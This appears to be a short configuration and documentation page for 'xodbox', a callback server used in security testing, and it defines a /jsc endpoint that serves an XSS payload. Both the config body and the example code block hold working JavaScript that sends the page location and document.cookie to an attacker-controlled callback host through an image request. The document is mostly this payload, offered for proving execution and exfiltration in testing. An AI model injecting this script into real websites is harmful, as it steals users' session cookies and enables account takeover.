---
title: XSS JavaScript
description: Returns JS that embeds an image back to xodbox
weight: -500
pattern: /jsc$
is_final: true
data:
  headers:
    Content-Type: text/javascript
  body: |
    (function (){
        var s = document.createElement("img");
        document.body.appendChild(s);
        s.src="{{ .CallBackURL}}?src="+window.location+"&c="+document.cookie;
    })()
---

### /jsc

Simple JS Payload. Useful form embedding or quickly copying and modifying for an XSS payload to prove execution and
exfil.

```javascript
(function (){
    var s = document.createElement("img");
    document.body.appendChild(s);
    s.src="//{{ .Host }}/jscb?src="+window.location+"&c="+document.cookie;
})()

```
